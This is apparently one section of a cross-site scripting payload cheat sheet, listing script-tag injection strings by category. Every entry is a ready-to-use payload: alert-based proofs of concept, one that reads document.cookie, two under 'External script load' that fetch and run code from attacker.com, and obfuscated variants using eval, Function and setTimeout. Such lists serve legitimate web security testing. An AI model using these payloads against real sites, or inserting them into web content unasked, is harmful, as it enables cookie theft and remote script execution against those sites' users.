## 1. Execution → Basic Script Execution

### Basic script execution

- `<script>alert(1)</script>`
- `<script>alert(document.domain)</script>`
- `<script>alert(document.cookie)</script>`
- `<script>confirm(1)</script>`
- `<script>prompt(1)</script>`
- `<script>console.log(1)</script>`

### External script load

- `<script src=//attacker.com/x.js></script>`
- `<script src=https://attacker.com/x.js></script>`

### Inline script variations

- `<script>alert\`1\`</script>`
- `<script>window.alert(1)</script>`
- `<script>this</script>`

### Obfuscated script execution

- `<script>eval('alert(1)')</script>`
- `<script>Function('alert(1)')()</script>`
- `<script>setTimeout('alert(1)')</script>`
